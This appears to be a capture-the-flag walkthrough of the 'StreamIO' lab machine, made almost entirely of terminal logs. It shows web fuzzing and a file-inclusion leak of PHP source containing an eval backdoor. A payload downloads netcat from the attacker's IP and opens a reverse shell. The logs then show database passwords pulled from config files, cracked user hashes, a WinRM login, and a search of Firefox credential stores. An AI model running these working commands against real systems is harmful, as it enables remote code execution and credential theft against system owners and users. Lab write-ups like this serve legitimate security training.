┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie:PHPSESSID=gglbps4hbr1vt31saqjev4q6ho" --hh 1678
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?FUZZ=
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                     
=====================================================================

000001575:   200        49 L     137 W      1712 Ch     "debug"                                                                                                                                                                                     
000003530:   200        10790    25878 W    320235 Ch   "movie"                                                                                                                                                                                     
                        L                                                                                                                                                                                                                           
000005450:   200        398 L    916 W      12484 Ch    "staff"                                                                                                                                                                                     
000006133:   200        62 L     160 W      2073 Ch     "user"                                                                                                                                                                                      

Total time: 68.41370
Processed Requests: 6453
Filtered Requests: 6449
Requests/sec.: 94.32320

```

![](Pasted%20image%2020260324230342.png)

![](Pasted%20image%2020260324230500.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo feroxbuster -u https://streamio.htb/admin -x php -k
                                                                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://streamio.htb/admin
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      150c https://streamio.htb/admin => https://streamio.htb/admin/
301      GET        2l       10w      157c https://streamio.htb/admin/images => https://streamio.htb/admin/images/
301      GET        2l       10w      153c https://streamio.htb/admin/js => https://streamio.htb/admin/js/
301      GET        2l       10w      154c https://streamio.htb/admin/css => https://streamio.htb/admin/css/
301      GET        2l       10w      157c https://streamio.htb/admin/Images => https://streamio.htb/admin/Images/
403      GET        1l        1w       18c https://streamio.htb/admin/index.php
301      GET        2l       10w      156c https://streamio.htb/admin/fonts => https://streamio.htb/admin/fonts/
301      GET        2l       10w      154c https://streamio.htb/admin/CSS => https://streamio.htb/admin/CSS/
404      GET        0l        0w     1245c https://streamio.htb/admin/compare.php
301      GET        2l       10w      153c https://streamio.htb/admin/JS => https://streamio.htb/admin/JS/
301      GET        2l       10w      153c https://streamio.htb/admin/Js => https://streamio.htb/admin/Js/
301      GET        2l       10w      154c https://streamio.htb/admin/Css => https://streamio.htb/admin/Css/
200      GET        2l        6w       58c https://streamio.htb/admin/master.php
301      GET        2l       10w      156c https://streamio.htb/admin/Fonts => https://streamio.htb/admin/Fonts/
404      GET       40l      156w     1894c https://streamio.htb/admin/con
404      GET       40l      156w     1898c https://streamio.htb/admin/css/con
404      GET       40l      156w     1897c https://streamio.htb/admin/js/con
404      GET       40l      156w     1901c https://streamio.htb/admin/images/con
404      GET       40l      156w     1901c https://streamio.htb/admin/Images/con
404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/con
404      GET       40l      156w     1898c https://streamio.htb/admin/CSS/con
404      GET       40l      156w     1897c https://streamio.htb/admin/JS/con
[####################] - 83m   330032/330032  0s      found:22      errors:283226 
[####################] - 75m    30000/30000   7/s     https://streamio.htb/admin/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/images/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/js/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/css/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/Images/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/fonts/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/CSS/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/JS/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/Js/ 
[####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/Css/ 
[####################] - 75m    30000/30000   7/s     https://streamio.htb/admin/Fonts/
```

`master.php`

![](Pasted%20image%2020260325221408.png)

```bash
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

![](Pasted%20image%2020260330170023.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ echo "onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg== " | base64 -d | tee master.php
base64: invalid input
yr<h1>Movie managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>                               
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ ls -liah nc64.exe 
2764208 -rwxrwxr-x 1 kali kali 45K Mar 30 05:21 nc64.exe
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ vim shell.py                      
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat shell.py                
system('powershell -c wget http://10.10.16.58/nc64.exe -outfile \\programdata\\nc64.exe');
system('\\programdata\\nc64.exe -e powershell 10.10.16.58 443');
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ curl -X POST 'https://streamio.htb/admin/?debug=master.php' -k -b 'PHPSESSID=o39friqont7cboifpts1bnjbq0' -d 'include=http://10.10.16.58/shell.py'                  

```

![](Pasted%20image%2020260330174302.png)

```bash
PS C:\inetpub> cd streamio.htb
cd streamio.htb
PS C:\inetpub\streamio.htb> dir -recurse *.php | select-string -pattern "database"
dir -recurse *.php | select-string -pattern "database"

admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');


PS C:\inetpub\streamio.htb> cd ..\watch.streamio.htb
cd ..\watch.streamio.htb
PS C:\inetpub\watch.streamio.htb> dir -recurse *.php | select-string -pattern "database"
dir -recurse *.php | select-string -pattern "database"

search.php:15:$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
```

```bash
PS C:\inetpub> where.exe sqlcmd.exe
where.exe sqlcmd.exe
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
```

```bash
PS C:\inetpub\streamio.htb\admin> sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select name from sys.tables;"
sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select name from sys.tables;"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
PS C:\inetpub\streamio.htb\admin> sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
sqlcmd.exe -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ vim user_creds_raw      
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat user_creds_raw 
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat user_creds_raw | awk -F ' ' '{print $2":"$3}' | tee user_creds
nikk37:389d14cb8e4e9b94b137deb1caf0612a
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ hashcat -m 0 user_creds /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 13912/27888 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 8 digests; 8 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com 
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: user_creds
Time.Started.....: Mon Mar 30 09:39:57 2026 (3 secs)
Time.Estimated...: Mon Mar 30 09:40:00 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4091.8 kH/s (0.25ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 4/8 (50.00%) Digests (total), 4/8 (50.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 41%

Started: Mon Mar 30 09:39:47 2026
Stopped: Mon Mar 30 09:40:01 2026
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ hashcat -m 0 user_creds /usr/share/wordlists/rockyou.txt --user --show
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

```bash
PS C:\users> dir
             dir
dir



    Directory: C:\users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/22/2022   2:48 AM                .NET v4.5                                                             
d-----        2/22/2022   2:48 AM                .NET v4.5 Classic                                                     
d-----        2/26/2022  10:20 AM                Administrator                                                         
d-----         5/9/2022   5:38 PM                Martin                                                                
d-----        2/26/2022   9:48 AM                nikk37                                                                
d-r---        2/22/2022   1:33 AM                Public
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ hashcat --help | grep 'user'
     --username                 |      | Enable ignoring of usernames in hashfile             |
  29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))    | Operating System
  25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass        | Document
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i streamio.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents> whoami
streamio\nikk37
```

```bash
*Evil-WinRM* PS C:\programdata\apps> powershell -c wget http://10.10.16.58/winpeas.exe -outfile winpeas.exe
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/31/2026   7:51 AM       10170880 winpeas.exe


*Evil-WinRM* PS C:\programdata\apps> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
*Evil-WinRM* PS C:\programdata\apps> .\winpeas.exe log
"log" argument present, redirecting output to file "out.txt"
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/31/2026   7:55 AM         136353 out.txt
-a----        3/31/2026   7:51 AM       10170880 winpeas.exe

*Evil-WinRM* PS C:\programdata\apps> download out.txt
                                        
Info: Downloading C:\programdata\apps\out.txt to out.txt
                                        
Info: Download successful!
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ ls -liah out.txt 
2765013 -rw-rw-r-- 1 kali kali 134K Mar 31 03:58 out.txt
```

```bash
╔══════════╣ Looking for Firefox DBs
1801   │ ╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
1802   │     Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
1803   │ ╚ Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```

```bash
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default> pwd

Path
----
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default


*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default> dir


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2022   2:40 AM             47 times.json


*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default>  type times.json
{
"created": 1645526416905,
"firstUse": null
}

*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default> cd ..
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles> dir


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                5rwivk2l.default
d-----        2/22/2022   2:42 AM                br53rxeg.default-release


*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles> cd br53rxeg.default-release
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> dir


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                bookmarkbackups
d-----        2/22/2022   2:40 AM                browser-extension-data
d-----        2/22/2022   2:41 AM                crashes
d-----        2/22/2022   2:42 AM                datareporting
d-----        2/22/2022   2:40 AM                minidumps
d-----        2/22/2022   2:42 AM                saved-telemetry-pings
d-----        2/22/2022   2:40 AM                security_state
d-----        2/22/2022   2:42 AM                sessionstore-backups
d-----        2/22/2022   2:40 AM                storage
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:42 AM           5189 addonStartup.json.lz4
-a----        2/22/2022   2:42 AM            310 AlternateServices.txt
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM            208 compatibility.ini
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM         229376 content-prefs.sqlite
-a----        2/22/2022   2:40 AM          98304 cookies.sqlite
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:42 AM        5242880 favicons.sqlite
-a----        2/22/2022   2:41 AM         262144 formhistory.sqlite
-a----        2/22/2022   2:40 AM            778 handlers.json
-a----        2/22/2022   2:40 AM         294912 key4.db
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
-a----        2/22/2022   2:41 AM           2081 logins.json
-a----        2/22/2022   2:42 AM              0 parent.lock
-a----        2/22/2022   2:42 AM          98304 permissions.sqlite
-a----        2/22/2022   2:40 AM            506 pkcs11.txt
-a----        2/22/2022   2:42 AM        5242880 places.sqlite
-a----        2/22/2022   2:42 AM           8040 prefs.js
-a----        2/22/2022   2:42 AM            180 search.json.mozlz4
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:42 AM           1853 sessionstore.jsonlz4
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:42 AM            611 SiteSecurityServiceState.txt
